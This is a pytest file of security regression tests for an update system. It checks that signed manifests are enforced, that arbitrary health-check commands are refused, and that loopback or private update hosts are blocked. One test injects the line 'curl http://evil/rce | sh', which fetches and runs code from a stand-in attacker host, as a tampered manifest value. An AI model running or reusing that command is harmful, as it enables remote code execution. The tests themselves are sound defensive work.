"""Security regression tests for update manifest trust (findings V1, V2).

V1: manifest.json drives install behavior (health_checks[].argv is executed
via subprocess during health_check), so a bundle whose signed archive is
intact but whose manifest.json has been tampered must be REFUSED in TUF mode.
manifest.json must be a first-class signed TUF target, and _run_health_checks
must refuse to execute an arbitrary external program even from a manifest.

V2: the update download opener must route through public-address validation so
a loopback/private update host is refused (SSRF hardening), while preserving
the length+SHA-256+TUF gating and the operator escape hatch for internal
mirrors.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

import sonder_runtime.adapters.updates.service as sonder_updates
from sonder_runtime.adapters.updates.service import (
    BundleManifest,
    TrustError,
    build_bundle,
    resumable_download,
    verify_bundle_trust,
)

pytestmark = pytest.mark.integration


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _mini_src(tmp_path: Path) -> Path:
    src = tmp_path / "src"
    (src / "pkg").mkdir(parents=True)
    (src / "pkg" / "__init__.py").write_text("", encoding="utf-8")
    (src / "app.py").write_text("print('hi')\n", encoding="utf-8")
    return src


@pytest.fixture()
def tuf_repo_mod():
    pytest.importorskip("tuf")
    pytest.importorskip("securesystemslib")
    tools = str(Path(__file__).resolve().parent.parent / "tools")
    if tools not in sys.path:
        sys.path.insert(0, tools)
    import tuf_repo

    return tuf_repo


@pytest.fixture()
def signed_bundle(tmp_path, tuf_repo_mod):
    """A properly published offline bundle: archive AND manifest.json signed."""
    tuf_repo_mod.init_repo(tmp_path / "repo")
    build_bundle(_mini_src(tmp_path), tmp_path / "built", version="1.4.0")
    info = tuf_repo_mod.build_offline_bundle(
        tmp_path / "repo", tmp_path / "built", tmp_path / "offline"
    )
    return Path(info["offline_bundle"])


def _legacy_bundle_without_signed_manifest(tmp_path, tuf_repo_mod) -> Path:
    """Publish only the archive as a target (the pre-fix layout): manifest.json
    is copied beside the metadata but is NOT a signed target."""
    import shutil

    repo = tmp_path / "repo"
    built = tmp_path / "built"
    out = tmp_path / "legacy"
    tuf_repo_mod.init_repo(repo)
    build_bundle(_mini_src(tmp_path), built, version="2.2.0")
    manifest = json.loads((built / "manifest.json").read_text(encoding="utf-8"))
    archive_name = manifest["archive"]["name"]
    tuf_repo_mod.publish_target(repo, built / archive_name, archive_name)

    out.mkdir(parents=True)
    (out / "metadata").mkdir()
    (out / "targets").mkdir()
    for name in ("root", "targets", "snapshot", "timestamp"):
        shutil.copy2(repo / "metadata" / f"{name}.json",
                     out / "metadata" / f"{name}.json")
    shutil.copy2(repo / "targets" / archive_name, out / "targets" / archive_name)
    shutil.copy2(built / "manifest.json", out / "manifest.json")
    return out


# ---------------------------------------------------------------------------
# V1 — manifest.json is a signed target and is verified in TUF mode
# ---------------------------------------------------------------------------

def test_properly_signed_manifest_passes(signed_bundle):
    manifest = BundleManifest.load(signed_bundle / "manifest.json")
    assert verify_bundle_trust(
        signed_bundle, manifest, allow_unverified=False
    ) == "tuf"


def test_tampered_manifest_argv_is_refused_in_tuf_mode(signed_bundle):
    # The signed archive is left intact; only manifest.json is rewritten to
    # inject a malicious health-check argv. TUF mode must refuse the bundle
    # because manifest.json no longer matches its signed target.
    manifest_path = signed_bundle / "manifest.json"
    raw = json.loads(manifest_path.read_text(encoding="utf-8"))
    raw["health_checks"] = [{
        "kind": "command",
        "argv": ["/bin/sh", "-c", "curl http://evil/rce | sh"],
        "timeout_seconds": 60,
    }]
    manifest_path.write_text(json.dumps(raw, indent=2), encoding="utf-8")
    # The archive target itself is untouched and still verifies on its own.
    manifest = BundleManifest.load(manifest_path)
    with pytest.raises(TrustError):
        verify_bundle_trust(signed_bundle, manifest, allow_unverified=False)


def test_any_manifest_byte_change_is_refused_in_tuf_mode(signed_bundle):
    # Even a benign one-byte change (e.g. re-serialization) fails: the on-disk
    # bytes must match the signed target exactly.
    manifest_path = signed_bundle / "manifest.json"
    raw = json.loads(manifest_path.read_text(encoding="utf-8"))
    raw["resources"]["minimum_free_bytes"] = 1
    manifest_path.write_text(json.dumps(raw), encoding="utf-8")
    manifest = BundleManifest.load(manifest_path)
    with pytest.raises(TrustError):
        verify_bundle_trust(signed_bundle, manifest, allow_unverified=False)


def test_manifest_absent_from_signed_metadata_is_refused(tmp_path, tuf_repo_mod):
    bundle = _legacy_bundle_without_signed_manifest(tmp_path, tuf_repo_mod)
    manifest = BundleManifest.load(bundle / "manifest.json")
    with pytest.raises(TrustError, match="manifest.json"):
        verify_bundle_trust(bundle, manifest, allow_unverified=False)


def test_publisher_signs_manifest_as_target(signed_bundle):
    # The published targets metadata must carry manifest.json as a target.
    targets = json.loads(
        (signed_bundle / "metadata" / "targets.json").read_text(encoding="utf-8")
    )
    assert "manifest.json" in targets["signed"]["targets"]


def test_signed_manifest_installs_through_engine_without_unsigned_gate(
    signed_bundle, tmp_path, monkeypatch
):
    import sonder_runtime.adapters.updates.engine as sonder_update_engine

    home = tmp_path / "home"
    monkeypatch.setenv("SONDER_HOME", str(home))
    monkeypatch.setenv("SONDER_OPERATIONS_DB", str(home / "operations.db"))
    monkeypatch.setenv("SONDER_UPDATES_DB", str(home / "updates.db"))
    monkeypatch.delenv("SONDER_UPDATE_ALLOW_UNSIGNED", raising=False)
    manager = sonder_update_engine.UpdateManager(
        releases_dir=tmp_path / "releases",
        current_link=tmp_path / "current",
        backup_target=str(tmp_path / "backups"),
    )
    plan = manager.import_offline(signed_bundle, allow_unverified=False)
    assert plan["status"] == "available", plan


def test_unsigned_dev_path_unaffected_by_manifest_signing(
    tmp_path, monkeypatch
):
    # The gated unsigned path (no metadata/ dir) must still work for non-prod.
    monkeypatch.setenv("SONDER_UPDATE_ALLOW_UNSIGNED", "1")
    out = tmp_path / "bundle"
    build_bundle(_mini_src(tmp_path), out, version="1.0.0")
    manifest = BundleManifest.load(out / "manifest.json")
    assert verify_bundle_trust(
        out, manifest, allow_unverified=True
    ) == "unsigned-explicitly-allowed"


# ---------------------------------------------------------------------------
# V1 — _run_health_checks refuses an arbitrary external argv
# ---------------------------------------------------------------------------

def _manager(tmp_path):
    import sonder_runtime.adapters.updates.engine as sonder_update_engine
    from sonder_runtime.adapters.updates.service import UpdateRepository

    return sonder_update_engine.UpdateManager(
        repository=UpdateRepository(str(tmp_path / "updates.db")),
        releases_dir=tmp_path / "releases",
        current_link=tmp_path / "current",
        backup_target=str(tmp_path / "backups"),
    )


def _manifest_with_health(health_checks):
    raw = {
        "schema_version": 1,
        "bundle_id": "b", "version": "1.0.0", "commit_sha": "c",
        "channel": "stable", "platform": "linux", "architecture": "x86_64",
        "package_format": "tar.gz", "runtime": {"python_version": "3.11"},
        "state_schema": {}, "resources": {}, "entrypoints": {},
        "health_checks": health_checks, "rollback": {},
        "files": [{"path": "a.py", "length": 1, "sha256": "0" * 64}],
    }
    return BundleManifest.from_dict(raw)


def test_health_check_refuses_arbitrary_external_argv(tmp_path):
    manager = _manager(tmp_path)
    sentinel = tmp_path / "pwned"
    # An external absolute-path program that would create a marker file if run.
    manifest = _manifest_with_health([{
        "kind": "command",
        "argv": ["/usr/bin/touch", str(sentinel)],
        "timeout_seconds": 30,
    }])
    release_dir = tmp_path / "release"
    release_dir.mkdir()
    problems = manager._run_health_checks(manifest, release_dir)
    assert problems, "external argv[0] must be refused"
    assert any("interpreter" in p or "external" in p for p in problems)
    # Crucially, the external program was never executed.
    assert not sentinel.exists()


def test_health_check_refuses_bare_shell_argv(tmp_path):
    manager = _manager(tmp_path)
    manifest = _manifest_with_health([{
        "kind": "command",
        "argv": ["sh", "-c", "echo owned"],
        "timeout_seconds": 30,
    }])
    release_dir = tmp_path / "release"
    release_dir.mkdir()
    problems = manager._run_health_checks(manifest, release_dir)
    assert problems


def test_health_check_accepts_release_interpreter_argv(tmp_path):
    manager = _manager(tmp_path)
    manifest = _manifest_with_health([{
        "kind": "command",
        "argv": ["{python}", "-c", "import sys; sys.exit(0)"],
        "timeout_seconds": 30,
    }])
    release_dir = tmp_path / "release"
    release_dir.mkdir()
    assert manager._run_health_checks(manifest, release_dir) == []


def test_health_check_reports_nonzero_release_interpreter_exit(tmp_path):
    manager = _manager(tmp_path)
    manifest = _manifest_with_health([{
        "kind": "command",
        "argv": ["{python}", "-c", "import sys; sys.exit(7)"],
        "timeout_seconds": 30,
    }])
    release_dir = tmp_path / "release"
    release_dir.mkdir()
    problems = manager._run_health_checks(manifest, release_dir)
    assert problems and "exited 7" in problems[0]


# ---------------------------------------------------------------------------
# V2 — update download opener rejects non-public/loopback hosts
# ---------------------------------------------------------------------------

def test_opener_rejects_loopback_update_host(tmp_path):
    dest = tmp_path / "engine.tar.gz"
    with pytest.raises(TrustError):
        # No opener injected: the default opener must validate the source.
        resumable_download("http://127.0.0.1:9/engine.tar.gz", dest)
    assert not dest.exists()


def test_assert_public_update_source_rejects_loopback():
    with pytest.raises(TrustError):
        sonder_updates._assert_public_update_source("http://127.0.0.1/x")


def test_assert_public_update_source_rejects_private_and_link_local():
    with pytest.raises(TrustError):
        sonder_updates._assert_public_update_source("http://10.0.0.5/x")
    with pytest.raises(TrustError):
        sonder_updates._assert_public_update_source("http://169.254.169.254/x")


def test_assert_public_update_source_allows_public_literal_ip():
    addresses = sonder_updates._assert_public_update_source("http://8.8.8.8/x")
    assert addresses == ("8.8.8.8",)


def test_insecure_source_escape_hatch_allows_internal_mirror(monkeypatch):
    # Operators running an internal/air-gapped mirror can opt out explicitly;
    # the default fails closed, mirroring the unsigned-bundle escape hatch.
    monkeypatch.setenv("SONDER_UPDATE_ALLOW_INSECURE_SOURCE", "1")
    assert sonder_updates._assert_public_update_source("http://127.0.0.1/x") is None


def test_pinned_connect_failure_never_falls_back_to_unpinned_open(monkeypatch):
    """A failed pinned connect must not retry through the unpinned opener.

    The plain urlopen re-resolves DNS and follows redirects with no address
    check, so falling back on a pinned-connect failure hands a hostile origin
    a second, unvalidated resolution just by refusing the first connection.
    """
    import urllib.error
    import urllib.request

    import web_tools

    def _pinned_boom(req, timeout=None):
        raise urllib.error.URLError("no validated address was reachable")

    unpinned_calls = []

    def _unpinned(req, timeout=None):
        unpinned_calls.append(getattr(req, "full_url", req))
        raise AssertionError("the unpinned opener must never be reached")

    monkeypatch.setattr(web_tools, "_urlopen", _pinned_boom)
    monkeypatch.setattr(urllib.request, "urlopen", _unpinned)

    with pytest.raises(urllib.error.URLError):
        sonder_updates._default_opener("http://8.8.8.8/engine.tar.gz", {})
    assert unpinned_calls == []


def test_opener_rejects_non_http_scheme(tmp_path):
    with pytest.raises(TrustError):
        sonder_updates._assert_public_update_source("ftp://example.com/x")
